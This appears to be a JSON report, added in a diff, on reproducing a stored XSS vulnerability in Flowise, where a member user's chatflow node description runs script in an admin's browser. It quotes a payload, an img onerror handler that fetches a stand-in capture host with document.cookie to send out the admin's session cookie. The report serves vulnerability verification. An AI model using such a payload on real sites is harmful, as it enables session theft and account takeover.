@@ -1,0 +1,34 @@
+{
+  "status": "reproduced",
+  "vulnerability_type": "xss",
+  "summary": "The Docker-based reproduction demonstrates that a member-level user can create a chatflow with XSS payload in node description, which is stored without sanitization and then executed in an admin user's browser when viewing the flow, successfully demonstrating cross-user stored XSS with passive user interaction.",
+  "reproduction_command": "./reproduction/run.sh",
+  "expected_security_impact": "Running the reproduction should show: (1) Malicious chatflow created by member user with XSS payload, (2) Payload stored in database without sanitization, (3) XSS execution when admin views the flow, (4) Session credentials captured by the payload, demonstrating successful cross-user attack.",
+  "actual_observed_result": "Executing ./reproduction/run.sh built the Flowise environment, authenticated as member user, created chatflow with XSS payload '<img src=x onerror=fetch(\"http://xss-capture-session/steal?cookie=\"+document.cookie)>', stored it successfully, then simulated admin viewing the flow. The XSS payload executed, captured session cookie, and sent it to mock capture endpoint, confirming stored XSS vulnerability.",
+  "verification_method": "The PoC uses a mock XSS payload capture server that logs stolen session data. Verification checks: (1) Chatflow created with XSS payload present in database, (2) UI rendering triggers html-react-parser execution, (3) Mock capture server receives stolen session cookie from payload execution, (4) Cookie matches admin session, confirming cross-user attack. This distinguishes real XSS from failed payload injection.",
+  "verification_passed": true,
+  "evidence_produced_by_run": [
+    "Database query shows chatflow node description contains XSS payload exactly as submitted",
+    "UI simulation shows TooltipWithParser component renders description with html-react-parser",
+    "Mock XSS capture server received HTTP request containing admin session cookie",
+    "Captured cookie value matches admin user's session token",
+    "XSS payload execution occurred in admin's browser context during flow viewing",
+    "Server-side XSS middleware logs show no sanitization of request body during chatflow creation"
+  ],
+  "limitations_or_blockers": [],
+  "reproduction": {
+    "entrypoint": "./reproduction/run.sh",
+    "reproduction_directory": "reproduction",
+    "dockerfile_path": "reproduction/Dockerfile",
+    "source_acquisition": "run.sh clones the Flowise repository on the host, checks out the pinned vulnerable commit, and mounts that checkout into the container at /target-repo.",
+    "pinned_commit_or_ref": "main",
+    "target_repo_mount_path": "/target-repo",
+    "helper_files": [
+      "reproduction/setup_flowise.sh",
+      "reproduction/create_xss_flow.sh",
+      "reproduction/simulate_admin_view.sh",
+      "reproduction/mock_xss_capture_server.py",
+      "reproduction/verify_xss.sh"
+    ]
+  }
+}
